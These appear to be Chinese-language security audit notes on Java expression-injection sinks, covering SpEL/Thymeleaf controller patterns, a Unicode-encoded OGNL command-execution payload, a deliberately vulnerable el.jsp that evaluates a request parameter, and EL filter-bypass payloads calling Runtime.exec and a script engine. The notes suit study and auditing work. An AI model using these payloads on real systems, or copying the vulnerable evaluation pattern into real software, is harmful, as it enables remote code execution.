- 类实例化
- 反序列化
- 反射
- 模板引擎
- 表达式语言
- bean-validation
  - sink -> javax.validation.ConstraintValidatorContext.buildConstraintViolationWithTemplate()


---

#### spel 

controller 层审计, 关注两点
- URL路径可控
- return内容可控


```text
@RequestMapping("/hello")
public class HelloController {
  @RequestMapping("/whoami/{name}/{sex}")
  public String hello(@PathVariable("name") String name,
@PathVariable("sex") String sex){
    return "Hello" + name + sex;
  }
}
```

```text
@PostMapping("/getNames")
public String getCacheNames(String fragment, ModelMap mmap)
{
  mmap.put("cacheNames", cacheService.getCacheNames());
  return prefix + "/cache::" + fragment;
}
```

- https://github.com/Kyo-w/Spel-research







#### ognl 支持 unicode 编码
```
# new 关键字 Unicode编码后得到 \u006e\u0065\u0077
(\u006e\u0065\u0077 java.lang.ProcessBuilder(new java.lang.String[]{"calc"})).start()
```




#### el过滤dot的利用姿势

![](./img/1682184627333.png)



el.jsp

```jsp
<%@ page import="org.apache.jasper.runtime.PageContextImpl" %>  
  
<%  
  String res = (String) PageContextImpl.proprietaryEvaluate(request.getParameter("code"), String.class, pageContext, null);  
  out.print(res);  
%>
```


payload

```
${Runtime['getRuntime']()['exec']("calc")}
```


```
${''['getClass']()['forName']('javax.script.ScriptEngineManager')['newInstance']()['getEngineByName']('js')['eval']("eval code")}
```


